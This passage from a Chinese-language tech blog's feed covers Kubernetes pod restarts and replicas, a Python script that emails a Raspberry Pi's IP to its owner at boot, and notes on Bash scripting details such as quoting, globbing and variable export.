<code>http://192.168.64.6:30948/bye</code></p><p>你會發現容器掛掉後幾秒鐘，又自己重新跑起來了，並且 RESTARTS 的數量變成 1 了（原本是 0）：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NAME        READY   STATUS    RESTARTS   AGE</span><br><span class="line">curr-time   1/1     Running   1          8m56s</span><br></pre></td></tr></tbody></table></figure><h2 id="更強大的高可用性-replicas"><a href="#更強大的高可用性-replicas" class="headerlink" title="更強大的高可用性 - replicas"></a>更強大的高可用性 - replicas</h2><p>透過以上例子已經可以感覺到 <code>k8s</code> 的威力，但是其實 <code>docker</code> 本身就可以監測容器的狀態並且重新啟動了。<code>k8s</code> 更強大的地方在於它可以一次建立多個 <code>pod</code> 並且在一個 <code>pod</code> 掛掉時透過 <code>loadbalancer</code> 馬上把流量切換到其他 <code>pod</code> 中，這樣子使用者完全感覺不出來原來服務有掛掉過。</p><p>建立 <code>replicas</code>：<br><code>kubectl run curr-time --image=yiyu0x/current-time --replicas=3 --port 3000</code></p><p>對外打開：<br><code>kubectl expose deployment curr-time --port=3000 --type=NodePort</code></p><p>一樣透過 <code>watch kubectl get po</code> 來監控 <code>pod</code>：</p><p>（2019/1/17 更新：或是用 <code>kubectl get po -w</code>）</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Every 2.0s: kubectl get po</span><br><span class="line"></span><br><span class="line">NAME                         READY   STATUS    RESTARTS   AGE</span><br><span class="line">curr-time-6f9cb4fdf9-crc66   1/1     Running   3          7m41s</span><br><span class="line">curr-time-6f9cb4fdf9-hbkx5   1/1     Running   2          7m41s</span><br><span class="line">curr-time-6f9cb4fdf9-s742x   1/1     Running   2          7m41s</span><br></pre></td></tr></tbody></table></figure><p>然後戳一下 API 的 bye 位置，會發現：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Every 2.0s: kubectl get po</span><br><span class="line"></span><br><span class="line">NAME                         READY   STATUS      RESTARTS   AGE</span><br><span class="line">curr-time-6f9cb4fdf9-crc66   0/1     Completed   3          8m40s</span><br><span class="line">curr-time-6f9cb4fdf9-hbkx5   1/1     Running     2          8m40s</span><br><span class="line">curr-time-6f9cb4fdf9-s742x   1/1     Running     2          8m40s</span><br></pre></td></tr></tbody></table></figure><p>三個服務中的容器一個掛掉其他兩個還是正常運作中，使用者根本感覺不出來（流量會被導入到正常運作的 pod 中）後面的容器原來掛掉了！</p><h2 id="更更更強大的高可用性"><a href="#更更更強大的高可用性" class="headerlink" title="更更更強大的高可用性"></a>更更更強大的高可用性</h2><p>以上例子使用 <code>minikube</code> 來實驗，只有一個節點。真實情況甚至可以把好幾台機器全部給 <code>k8s</code> 進行管理。這樣子甚至連機器掛掉都可以保證服務不中斷，這才是真正的高可用性！</p><p>文中透過一個例子讓讀者了解到 <code>k8s</code> 的用處，但是沒有解釋很多問題，像是：</p><ul><li>為什麼建立的是 <code>pod</code> 不是 <code>container</code>？</li><li>為什麼需要 <code>expose</code>？</li><li><code>minikube</code> 是什麼？</li></ul><p>原因在於我認為先體驗一次這個技術的效果再去學習這個技術細解，有時候可能會比起直接去記憶那些硬生生的名詞來得有效果，所以看完這篇文章之後，如果不太懂裡面的細解可以再去看官方文件或是查閱其他 <code>k8s</code> 的概念講解文章。</p><p>看完之後再回來自己玩過一次，我相信會有不一樣的感覺的！</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="kubernetes" scheme="https://blog.yiyu0x.org/tags/kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>Raspberry Pi 開機時自動寄送 IP 設定</title>
    <link href="https://blog.yiyu0x.org/2019/12/15/"/>
    <id>https://blog.yiyu0x.org/2019/12/15/</id>
    <published>2019-12-15T08:51:07.000Z</published>
    <updated>2025-04-12T20:59:43.588Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在使用 Raspberry Pi（以下簡稱為 Pi）時，如果每一次都要佔用一個電腦的 USB port 非常不方便，而且電腦輸出電壓不一定夠，如果條件允許，我們會希望將 Pi 用變壓器獨立插在插座上，再使用 SSH 這類的工具遠端操作。</p><p>但是要 SSH 前必須要知道 IP，我們希望讓 Pi 在開機完畢後自動將 IP 發送至自己的信箱。如此一來之後只要 Pi 有取得 IP 的話就會自動寄信，我們不必再透過 USB 線材以及 screen 指令進行連線。</p><h2 id="寄信方式"><a href="#寄信方式" class="headerlink" title="寄信方式"></a>寄信方式</h2><p>要寄信的方式有兩種，一種是直接架設 SMTP server 來寄信，但是通常收信方會因為該信件的來源沒有 Domain Name 而不收信（惡意郵件），或是直接將信箱放置垃圾信件處理，所以不建議此種方式。</p><p>第二種方法則是利用 Gmail 提供的 SMTP server 來寄信（要自備 Gmail 帳號）。該方式需要先到 <a href="https://myaccount.google.com/lesssecureapps" target="_blank" rel="noopener">Google 低安全性應用程式存取權</a> 允許低安全性應用程式來存取你的帳戶，請斟酌使用。</p><h2 id="寄信腳本"><a href="#寄信腳本" class="headerlink" title="寄信腳本"></a>寄信腳本</h2><p>請將以下欄位自行填入，並且賦予該腳本執行權限。（建議使用 Python2）</p><ul><li>to</li><li>gmail_user</li><li>gmail_password</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># Which email address want to send</span></span><br><span class="line">to = <span class="string">'XXX'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Using specific gmail account</span></span><br><span class="line">gmail_user = <span class="string">'XXX'</span></span><br><span class="line">gmail_password = <span class="string">'XXX'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SMTP command</span></span><br><span class="line">smtpserver = smtplib.SMTP(<span class="string">'smtp.gmail.com'</span>, <span class="number">587</span>)</span><br><span class="line">smtpserver.ehlo()</span><br><span class="line">smtpserver.starttls()</span><br><span class="line">smtpserver.login(gmail_user, gmail_password)</span><br><span class="line">today = datetime.date.today()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux Specific shell command</span></span><br><span class="line">arg=<span class="string">'ip route list'</span></span><br><span class="line">p=subprocess.Popen(arg,shell=<span class="literal">True</span>,stdout=subprocess.PIPE)</span><br><span class="line">data = p.communicate()</span><br><span class="line">split_data = data[<span class="number">0</span>].split()</span><br><span class="line">ipaddr = split_data[split_data.index(<span class="string">'src'</span>)+<span class="number">1</span>]</span><br><span class="line">my_ip = <span class="string">'Your ip is %s'</span> %  ipaddr</span><br><span class="line">msg = MIMEText(my_ip)</span><br><span class="line">msg[<span class="string">'Subject'</span>] = <span class="string">'IP For RaspberryPi on %s'</span> % today.strftime(<span class="string">'%b %d %Y'</span>)</span><br><span class="line">msg[<span class="string">'From'</span>] = gmail_user</span><br><span class="line">msg[<span class="string">'To'</span>] = to</span><br><span class="line">smtpserver.sendmail(gmail_user, [to], msg.as_string())</span><br><span class="line">smtpserver.quit()</span><br></pre></td></tr></tbody></table></figure><h2 id="開機時執行"><a href="#開機時執行" class="headerlink" title="開機時執行"></a>開機時執行</h2><p>在 <code>/etc/rc.local</code> 中執行 Script（mail.py）</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IP=$(hostname -I) || <span class="literal">true</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$_IP</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">printf</span> <span class="string">"My IP address is %s\n"</span> <span class="string">"<span class="variable">$_IP</span>"</span></span><br><span class="line">  /home/pi/mail.py</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="raspberry_pi" scheme="https://blog.yiyu0x.org/tags/raspberry-pi/"/>
    
  </entry>
  
  <entry>
    <title>Shell Script 中那些錯過的事</title>
    <link href="https://blog.yiyu0x.org/2019/11/28/"/>
    <id>https://blog.yiyu0x.org/2019/11/28/</id>
    <published>2019-11-28T05:36:58.000Z</published>
    <updated>2025-04-12T20:59:43.588Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Shell Script 想必大家都有使用過，即使沒有真的寫 script，多少也會有在 command line 中透過 pipe 或是 and 條件句來將不同的指令結合在一起的經驗。</p><p>也因為 Shell 如此平凡，貼近一般環境，反而很少有人花時間去認真了解過 Shell。我自己也是這種人，於是近期讀了《精通 shell 程式設計 第四版》後，記錄了一些自己從來沒有了解過的細節。</p><h2 id="檔案名稱替換"><a href="#檔案名稱替換" class="headerlink" title="檔案名稱替換"></a>檔案名稱替換</h2><h3 id="字元"><a href="#字元" class="headerlink" title="* 字元"></a>* 字元</h3><p>在 Shell 中（此篇文章用 Bash 來當例子），<code>*</code> 會被轉譯成該目錄下所有檔案的名稱。（這件事是由 Shell 預先處理好。）</p><p>當 <code>echo *</code> 時，實際上會先把 * 替換成檔名（假如有 a b c 三個檔案），然後執行 <code>echo a b c</code> 印出 <code>a b c</code>。</p><p>以 echo 指令的角度，是沒有辦法辨別 a b c 是由 <code>*</code> 替換而來，echo 只知道自己收到三個參數分別為 a, b, c。</p><h3 id="字元-1"><a href="#字元-1" class="headerlink" title="? 字元"></a>? 字元</h3><p>? 可以對應單一字元，例如 ?? 可以對應出全部剛好兩字元的檔名，如果想要匹配兩個字元以上（包含兩個字元）的檔名可以使用 ??*</p><p>該配對方式與 Regular Expression 類似，但並非 Regular Expression。</p><h2 id="輸入重導向"><a href="#輸入重導向" class="headerlink" title="輸入重導向"></a>輸入重導向</h2><p>在一行指令開始執行時，其實 Shell 已經默默幫我們做了一些事情。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wc -l users <span class="comment"># 5 s.sh</span></span><br><span class="line">wc -l < s.sh <span class="comment"># 5</span></span><br></pre></td></tr></tbody></table></figure><p>以上兩者的輸出並不相同，差異在於後者是透過標準輸入傳入，wc 程式並無法得知是哪一個檔案傳進來的內容，所以無從得知檔名。</p><h2 id="變數相關"><a href="#變數相關" class="headerlink" title="變數相關"></a>變數相關</h2><h3 id="變數"><a href="#變數" class="headerlink" title="變數"></a>變數</h3><ul><li>變數型態只有字串變數</li><li>宣告變數時 = 號左右不能有空格</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = hello <span class="comment"># 錯誤</span></span><br><span class="line">a=hello   <span class="comment"># 正確</span></span><br></pre></td></tr></tbody></table></figure><ul><li>當字串代有空格時，要用 <code>'</code> 或 <code>"</code> 來夾住字串</li><li>單引號夾住的內容不會再進行轉譯，雙引號的內容會再進行轉譯</li><li>$ 字號用來取值（shell 會進行替換）</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var1=hi</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'$var1'</span> <span class="comment"># $var1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$var1</span>"</span> <span class="comment"># hi</span></span><br></pre></td></tr></tbody></table></figure><h3 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h3><p>unset 是一個好用的指令，用來把變數取消設置，也可以將 function, alias 的設定取消：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msg=hello</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$msg</span> <span class="comment"># hello</span></span><br><span class="line"><span class="built_in">unset</span> msg</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$msg</span> <span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p>還有一種取消的方式為指定空值：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msg=hello</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$msg</span> <span class="comment"># hello</span></span><br><span class="line">msg=      <span class="comment"># 不指定</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$msg</span> <span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><ul><li>取消 alias : <code>unset -a <alias-name></code></li><li>取消 function : <code>unset -f <func-name></code></li></ul><h3 id="“-var”-與-var-的差異"><a href="#“-var”-與-var-的差異" class="headerlink" title="“$var” 與 $var 的差異"></a>“$var” 與 $var 的差異</h3><p>（假設目錄下有 a b c 三個檔案）</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var=*</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span>    <span class="comment"># a b c</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$var</span>"</span>  <span class="comment"># *</span></span><br></pre></td></tr></tbody></table></figure><p>因為 <code>$var</code> 會替換成 <code>*</code> ，所以 <code>echo $var</code> 會先被 Shell 替換成 <code>echo *</code> 再替換成 <code>echo a b c</code>。</p><p>然而 <code>echo "$var"</code> 最後僅會被替換成 <code>echo "*"</code> 而印出 <code>*</code>。</p><p>（雙引號只會轉譯變數，不會轉譯 <code>*</code> 。）</p><p>由上述例子可知，為何比較好的寫法是在印出變數時外面再包一層雙引號。</p><h3 id="命令替換：-與"><a href="#命令替換：-與" class="headerlink" title="命令替換：`` 與 $()"></a>命令替換：`` 與 $()</h3><p>這兩個包裹字串的方式會讓字串內容當作指令來執行：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var=`date`</span><br><span class="line">var2=$(date)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$var</span>"</span>  <span class="comment"># Mon Nov 25 16:56:47 CST 2019</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$var2</span>"</span> <span class="comment"># Mon Nov 25 16:56:47 CST 2019</span></span><br></pre></td></tr></tbody></table></figure><p>差異在於 <code>$()</code> 是新的方式，兩個 ` 則是舊的方式</p><h2 id="常用指令以及被忽略的事"><a href="#常用指令以及被忽略的事" class="headerlink" title="常用指令以及被忽略的事"></a>常用指令以及被忽略的事</h2><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>echo 指令會無視空格（除非你用引號夾住字串）將空格當作分離不同參數的分隔符號：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> a b  c    d   e <span class="comment"># a b c d e</span></span><br></pre></td></tr></tbody></table></figure><p><code>-e</code> 參數用來開啟轉譯功能</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">"123\n"</span> <span class="comment"># 123</span></span><br><span class="line">                <span class="comment">#</span></span><br><span class="line"><span class="comment"># 因為 echo 本身會換行，所以 \n 會讓 output 有兩個換行</span></span><br><span class="line"><span class="comment"># \c 可以讓 echo 去除換行字元</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"123\c"</span> <span class="comment"># 123 04:17:55 yiyu@afra tmp →</span></span><br><span class="line"><span class="comment"># shell 的 PS1 會緊貼在 output 之後（因為沒有換行字元）</span></span><br></pre></td></tr></tbody></table></figure><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><p>使用 ls 指令，會列出該目錄下所有檔案，但不是一個檔案一行，想要一個檔案一行印出，可以使用 <code>ls -1</code></p><h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p>用來查看檔案的內容包行幾列、幾個單字、幾個字元。不幸的是 wc 的結果開頭都會有一個空白，可以使用 sed 將它剔除：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wc backup.sh</span><br><span class="line"><span class="comment"># 4  9 82 backup.sh</span></span><br><span class="line">wc backup.sh | sed <span class="string">'s/^ //g'</span></span><br><span class="line"><span class="comment">#4  9 82 backup.sh</span></span><br></pre></td></tr></tbody></table></figure><h3 id="sort-覆蓋自己"><a href="#sort-覆蓋自己" class="headerlink" title="sort 覆蓋自己"></a>sort 覆蓋自己</h3><p>sort 千萬不要直接重新導入自己，否則會清除該檔案內容：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat a.txt</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line">sort a.txt > a.txt</span><br><span class="line">cat a.txt</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p>如果有這個需求，可以加上 <code>-o</code> 參數：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat a.txt</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line">sort a.txt -o a.txt</span><br><span class="line">cat a.txt</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 3</span></span><br></pre></td></tr></tbody></table></figure><h2 id="參數"><a href="#參數" class="headerlink" title="參數"></a>參數</h2><h3 id="特殊變數"><a href="#特殊變數" class="headerlink" title="特殊變數"></a>特殊變數</h3><ul><li><code>$#</code> 會替換成參數數量</li><li><code>$*</code> 會替換成全部參數</li><li>我們都知道 $1, $2 用來指定不同參數，但假如是參數 10，$10 會被轉譯成 <code>$1</code> 以及 <code>0</code>，這時候就需要 <code>${n}</code> 格式來指定參數 10， <code>${10}</code>。</li></ul><h2 id="決策"><a href="#決策" class="headerlink" title="決策"></a>決策</h2><h3 id="退出狀態"><a href="#退出狀態" class="headerlink" title="退出狀態"></a>退出狀態</h3><ul><li>退出狀態為 0 代表成功，非 0 代表失敗</li><li>這個退出狀態並不是回傳值（這邊跟 C 語言不太一樣）</li><li>可以用 <code>$?</code> 查看上一個指令的退出狀態</li></ul><h3 id="test-指令"><a href="#test-指令" class="headerlink" title="test 指令"></a>test 指令</h3><ul><li>在 if 句中可以用 [] 來取代 test 兩者並無差別：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -e a;<span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"yes"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -e a ];<span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"yes"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></tbody></table></figure><p>上述兩種寫法是完全相同的，[] 也可以直接在 Shell 中使用：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ a = a ]</span><br><span class="line"><span class="built_in">echo</span> $?   <span class="comment"># 0</span></span><br></pre></td></tr></tbody></table></figure><ul><li>有個指令 exit 也可以自行設定退出狀態，若沒有指定，則會使用上一個指令的退出狀態當作退出狀態，即 <code>exit $?</code></li></ul><h3 id="Shell-Script-也可以-debug"><a href="#Shell-Script-也可以-debug" class="headerlink" title="Shell Script 也可以 debug"></a>Shell Script 也可以 debug</h3><ul><li>-v 參數可以先印出 script 內容，在執行 shell</li><li>-x 參數可以 debug，會逐行指示過程</li></ul><h3 id="空命令："><a href="#空命令：" class="headerlink" title="空命令："></a>空命令：</h3><p>在 if （或是 else, elif）中若沒有內容需要執行，需要加一個空命令 <code>：</code>，否則會報錯誤（類似 Python 中的 pass。）：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -e a;<span class="keyword">then</span></span><br><span class="line">    :</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"no"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></tbody></table></figure><h3 id="amp-amp-與"><a href="#amp-amp-與" class="headerlink" title="&& 與 ||"></a>&& 與 ||</h3><ul><li>在單行指令中使用 if 並不直覺，我們可以使用 && 與 || 來強化我們的指令</li><li>A && B : 當 A 指令成功則執行 B 指令（A 的退出狀態不為 0 時則不執行 B）</li><li>A || B : 當 A 指令執行失敗時，才執行 B</li></ul><p>例如：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -irn <span class="string">"target_str"</span> dic.txt || <span class="built_in">echo</span> <span class="string">"Couldn't not find"</span></span><br></pre></td></tr></tbody></table></figure><p>僅有在 grep 未搜尋到內容時，才會印出 Couldn’t not find。</p><h2 id="迴圈"><a href="#迴圈" class="headerlink" title="迴圈"></a>迴圈</h2><h3 id="與"><a href="#與" class="headerlink" title="$* 與 $@"></a>$* 與 $@</h3><p>我們有時候會透過 <code>$*</code> 取得全部的參數並且使用迴圈迭代，但如果我們的參數中是 <code>a b 'c d'</code> 三個參數，會因為 <code>$*</code> 是把 $1, $2, … 取出來，最後變成 a b c d 丟給迴圈迭代：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> arg <span class="keyword">in</span> $*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$arg</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><p>以上的程式碼會印出</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br></pre></td></tr></tbody></table></figure><p>此時我們可以用 <code>"$@"</code> 來改善，shell 會將其替換為 “$1”, “$2” …</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> arg <span class="keyword">in</span> <span class="string">"<span class="variable">$@</span>"</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$arg</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><p>以上的程式碼會印出：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line">c d</span><br></pre></td></tr></tbody></table></figure><p>切記！若 “$@” 沒有加上雙引號，那麼 $@ 以及 $* 的結果是一樣的。</p><h3 id="break-n"><a href="#break-n" class="headerlink" title="break n"></a>break n</h3><ul><li>Shell 的 break 可以一次跳出不止一層迴圈，在 break n 指定即可</li><li>若沒有指定 n 即跳出一層迴圈</li></ul><h3 id="迴圈次數的幾種指定方式"><a href="#迴圈次數的幾種指定方式" class="headerlink" title="迴圈次數的幾種指定方式"></a>迴圈次數的幾種指定方式</h3><ul><li>$(seq minimum maximum)</li><li>{minimum..maximum}</li><li>{minimum..maximum..step}</li><li>(( EXP1; EXP2; EXP3 ))</li></ul><h2 id="讀寫資料"><a href="#讀寫資料" class="headerlink" title="讀寫資料"></a>讀寫資料</h2><h3 id="變數-1"><a href="#變數-1" class="headerlink" title="$$ 變數"></a>$$ 變數</h3><p><code>$$</code> 變數用來顯示當前 PID。</p><p>寫 script 時可能會產生一些暫存檔，如果大家都同時在用這支 script，那麼 race condition 可能會發生。要避免的方式就是讓每一次執行所產生的暫存檔名稱都不一樣，那麼使用 <code>$$</code> 變數就會是一個好方法。</p><p>產生暫存檔較好的方式：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"This is tmp file"</span> > /tmp/tmpfile_$$</span><br></pre></td></tr></tbody></table></figure><h2 id="環境"><a href="#環境" class="headerlink" title="環境"></a>環境</h2><h3 id="區域變數"><a href="#區域變數" class="headerlink" title="區域變數"></a>區域變數</h3><p>在 Shell 的環境中，每執行一支 script 都會產生一個屬於該 script 自己的空間（可以想成是產生一個新的 process），該空間與外界互不干擾：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">☁ cat s.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">echo $x</span><br><span class="line">☁ x=100</span><br><span class="line">☁ ./s.sh</span><br><span class="line"></span><br><span class="line">☁ echo $x</span><br><span class="line">100</span><br></pre></td></tr></tbody></table></figure><p><code>s.sh</code> 腳本看不到外界的變數，外界也看不到它的變數。</p><h3 id="輸出變數"><a href="#輸出變數" class="headerlink" title="輸出變數"></a>輸出變數</h3><p>承上述，如果我們想要將目前的變數與 <code>子 Shell</code> 共享時，我們可以使用 <code>export</code> 指令</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">☁ export x</span><br><span class="line">☁ ./s.sh</span><br><span class="line">100</span><br></pre></td></tr></tbody></table></figure><ul><li>export -p ：查看目前 export 的變數列表</li></ul><h3 id="目錄以及環境"><a href="#目錄以及環境" class="headerlink" title="目錄以及環境"></a>目錄以及環境</h3><p>有了 <code>子 Shell</code> 的概念後，不難理解在 script 中變換目錄對於外界的 Shell 來說是沒有影響力的，因為彼此之間擁有獨立的空間。</p><p>那如果想要共享環境，用當前的 Shell 去執行 script 時呢？</p><p><code>.</code> 指令提供了這件事（其實就是 source 指令）。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 